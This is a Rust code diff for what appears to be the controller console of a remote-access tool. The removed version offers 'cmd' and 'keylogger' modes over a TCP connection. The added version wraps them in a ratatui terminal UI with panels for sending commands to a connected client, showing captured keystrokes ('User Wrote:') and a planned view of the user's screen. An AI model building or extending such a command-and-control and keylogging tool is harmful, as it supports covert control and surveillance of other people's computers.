@@ -1,60 +1,183 @@
-use std::io::{self, prelude::*};
-use std::net::{TcpListener, TcpStream};
+use std::io::prelude::*;
+use std::net::{TcpListener, TcpStream, SocketAddr};
 
-mod tui;
+use color_eyre::Result;
+use crossterm::event::{self, KeyCode};
+use ratatui::layout::{Constraint, Layout};
+use ratatui::text::{Line, Span};
+use ratatui::style::{Color, Style};
+use ratatui::widgets::{Block, Paragraph, List, ListItem};
+use ratatui::{DefaultTerminal, Frame};
 
-fn handle_connection(mut stream: TcpStream) {
-    println!("[*] client is connected");
-    let mut buf = [0; 512];
+fn main() -> Result<()> {
+    color_eyre::install()?;
+    ratatui::run(|terminal| App::new().run(terminal))
+}
 
-    print!("[?] which tool do you want to use ( cmd | keylogger ) -> ");
-    io::stdout().flush().unwrap(); 
+struct Core {
+    stream: TcpStream,
+    addr: SocketAddr,
+}
 
-    let mut tool = String::new();
-    io::stdin()
-        .read_line(&mut tool)
-        .expect("could not read line");
+impl Core {
+    fn init() -> Self {
+        let listener = TcpListener::bind("127.0.0.1:7878").unwrap();
 
-    match tool.as_str() {
-        "cmd" => {
-            loop {
-                print!(">> ");
-                io::stdout().flush().unwrap(); 
-                let mut input = String::new();
+        let (stream, addr) = listener
+            .accept()
+            .unwrap();
 
-                io::stdin()
-                    .read_line(&mut input)
-                    .expect("could not read line");
+        Core {
+            stream,
+            addr,
+        }
+    }
 
-                stream.write_all(input.as_bytes()).unwrap(); 
-            }
-        },
-        "keylogger" => {
-            while let Ok(bytes) = stream.read(&mut buf[..]) { 
-                let key = std::str::from_utf8(&buf[..bytes]);
-                println!("user wrote: {}", key.unwrap());
-            } 
+    fn is_connected(&self) -> bool {
+        true
+    }
 
-            return;
-        },
-        _ => println!("[!] error happened"),
+    pub fn handle_instructions(&mut self, input: String) -> Result<(), std::io::Error> {
+        self.stream.write_all(input.as_bytes())?;
+        self.stream.flush()?;
+        Ok(())
     }
 }
 
-fn main() {
-    tui::main().unwrap();
+struct App {
+    input: String,
+    character_index: usize,
+    messages: Vec<String>,
+    instructions: Vec<String>,
+    core: Core,
+}
 
-    /* 
-    let listener = TcpListener::bind("127.0.0.1:7878").unwrap();
-    println!("[*] listener is created, waiting for client ...");
-
-    for stream in listener.incoming() {
-        match stream {
-            Ok(stream) => {
-                handle_connection(stream);
-            }
-            Err(_e) => { println!("[ERROR] could not connect to server") }
+impl App {
+    fn new() -> Self {
+        Self {
+            input: String::new(),
+            messages: Vec::new(),
+            instructions: Vec::new(),
+            character_index: 0,
+            core: Core::init(),
         }
     }
-    */
+
+    fn move_cursor_left(&mut self) {
+        let cursor_moved_left = self.character_index.saturating_sub(1);
+        self.character_index = self.clamp_cursor(cursor_moved_left);
+    }
+
+    fn move_cursor_right(&mut self) {
+        let cursor_moved_right = self.character_index.saturating_add(1);
+        self.character_index = self.clamp_cursor(cursor_moved_right);
+    }
+
+    fn enter_char(&mut self, new_char: char) {
+        let index = self.byte_index();
+        self.input.insert(index, new_char);
+        self.move_cursor_right();
+    }
+
+    fn byte_index(&self) -> usize {
+        self.input
+            .char_indices()
+            .map(|(i, _)| i)
+            .nth(self.character_index)
+            .unwrap_or(self.input.len())
+    }
+
+    fn delete_char(&mut self) {
+        let is_not_cursor_leftmost = self.character_index != 0;
+        if is_not_cursor_leftmost {
+            let current_index = self.character_index;
+            let from_left_to_current_index = current_index - 1;
+
+            let before_char_to_delete = self.input.chars().take(from_left_to_current_index);
+            let after_char_to_delete = self.input.chars().skip(current_index);
+
+            self.input = before_char_to_delete.chain(after_char_to_delete).collect();
+            self.move_cursor_left();
+        }
+    }
+
+    fn clamp_cursor(&self, new_cursor_pos: usize) -> usize {
+        new_cursor_pos.clamp(0, self.input.chars().count())
+    }
+
+    const fn reset_cursor(&mut self) {
+        self.character_index = 0;
+    }
+
+    fn submit_instructions(&mut self) {
+        self.core.handle_instructions(self.input.clone()).unwrap();
+        self.instructions.push(self.input.clone());
+        self.messages.push(format!("handled instruction(-s): {}", self.input.clone()));
+        self.input.clear();
+        self.reset_cursor();
+    }
+
+    fn run(mut self, terminal: &mut DefaultTerminal) -> Result<()> {
+        if self.core.is_connected() {
+            self.messages.push(format!("client is connected from {}", self.core.addr));
+        }
+
+        loop {
+            terminal.draw(|frame| self.render(frame))?;
+
+            if let Some(key) = event::read()?.as_key_press_event() {
+                match key.code {
+                    KeyCode::Enter => self.submit_instructions(),
+                    KeyCode::Char(to_insert) => self.enter_char(to_insert),
+                    KeyCode::Backspace => self.delete_char(),
+                    KeyCode::Left => self.move_cursor_left(),
+                    KeyCode::Right => self.move_cursor_right(),
+                    _ => {}
+                }
+            }
+        }
+    }
+
+    fn render(&self, frame: &mut Frame) {
+        let main_layout = Layout::vertical([
+            Constraint::Percentage(75),
+            Constraint::Percentage(25),
+        ]).split(frame.area());
+
+        let sub_layout = Layout::horizontal([
+            Constraint::Percentage(50), 
+            Constraint::Percentage(50),
+        ]).split(main_layout[1]);
+
+        let layout = Layout::vertical([
+            Constraint::Percentage(50),
+            Constraint::Percentage(50),
+        ]).split(sub_layout[0]);
+
+        let user_screen = Paragraph::new("Here should be user screen")
+            .style(Style::default().fg(Color::Yellow))
+            .block(Block::bordered());
+        frame.render_widget(user_screen, main_layout[0]);
+
+        let messages: Vec<ListItem> = self
+            .messages
+            .iter()
+            .map(|m| {
+                let content = Line::from(Span::raw(format!("{m}")));
+                ListItem::new(content)
+            })
+            .collect();
+        let messages = List::new(messages).block(Block::bordered());
+        frame.render_widget(messages, sub_layout[1]);
+
+        let instructions = Paragraph::new(format!(">> {}", self.input.as_str()))
+            .style(Style::default().fg(Color::White))
+            .block(Block::bordered());
+        frame.render_widget(instructions, layout[1]);
+
+        let keylogger = Paragraph::new("User Wrote: ")
+            .style(Style::default().fg(Color::White))
+            .block(Block::bordered());
+        frame.render_widget(keylogger, layout[0]);
+    }
 }
